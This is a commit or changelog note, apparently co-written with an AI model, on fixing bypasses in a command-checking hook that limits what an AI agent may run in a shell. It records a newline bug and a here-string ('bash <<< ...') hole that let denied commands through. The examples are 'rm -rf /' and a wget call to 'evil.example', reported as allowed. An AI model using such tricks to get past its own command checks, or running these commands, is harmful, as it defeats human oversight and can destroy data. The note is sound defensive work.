@@ -1,0 +1,61 @@
+C-69: a newline separates commands — a fail-open present through 0.3.2
+
+Three fixes, found one behind the other, after the enforcing engine was split
+from the source it is developed in.
+
+The split (I-54). The Warden had been running from the working tree, so the
+constitution had to deny metaspace-membrane/core/** — correct, and it made the
+engine undevelopable by the agent. Both properties were wanted; they conflicted
+only because one copy did two jobs. The hook now runs a pip-installed copy
+outside the agent's write scope, so what enforces here is the artefact users
+get, and an engine fix reaches the live membrane only on a deliberate reinstall.
+
+C-68 / O-24 — a heredoc body was read as a list of commands.
+`python - <<'PY' … PY` was refused for invoking "programs" like `p,`, because
+the redirect target was dropped but the body stayed in the token stream. Bodies
+are now stripped before tokenizing. The `<<` operator is deliberately KEPT: it
+marks the sub-command as stdin-fed, which is harmless for python and must stay
+refused for a shell. Removing it too would have turned `bash <<'EOF'` into a
+bare `bash` — the fix for an over-block would have opened a hole.
+
+A live fail-open found while writing that proof: `bash <<< "…"` was ALLOWED.
+`<<<` is a redirection, so operator and target were both dropped and the
+sub-command collapsed to a bare `bash`, which the policy permits. A here-string
+is unverifiable shell input exactly like a pipe. The interpreter check now
+refuses any unseen stdin rather than pipes only.
+
+C-69 / O-25 — the serious one, and not about heredocs at all.
+With the body stripped, a command after the delimiter was still not caught. The
+cause: shlex with whitespace_split=True never emits a newline as a token, so
+the "\n" entry in _SEP was dead code and EVERY line after the first merged into
+the first sub-command. Only the first line's program was checked, and the
+denylist — which matches a token prefix — never saw the rest. Measured with git
+allowlisted and rm -rf denied:
+
+    git status
+    rm -rf /                      -> ALLOWED
+
+    git status
+    wget http://evil.example/x    -> ALLOWED
+
+Multi-line commands are how anyone writes more than one step, so this was
+reachable in ordinary use, not only under attack. It is present in every
+release up to and including 0.3.2 — a patch release is warranted.
+
+Newlines outside quotes now become explicit separators before tokenizing.
+Three cases survive it, each with a proof leg: a newline inside quotes stays
+data; a trailing backslash joins its lines rather than splitting them; and
+consecutive separators collapse, because a blank line emits `;;`, which shlex
+groups into one token that is not in _SEP — the commands around it would have
+merged again. Ordered after heredoc stripping, so a body's lines cannot become
+commands.
+
+Each fix uncovered the next, because each moved the analysis one layer down:
+the over-block hid the here-string hole, and the heredoc fix hid the newline
+hole. An over-blocking membrane is not merely annoying — it is opaque, and
+things hide in the noise.
+
+Suite: 50 proofs, 49 pass + 1 skip. Ledger: 48 proven, 6 blocked, 4 planned of
+69; 13 open obstacles of 25. Decision I-54.
+
+Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>
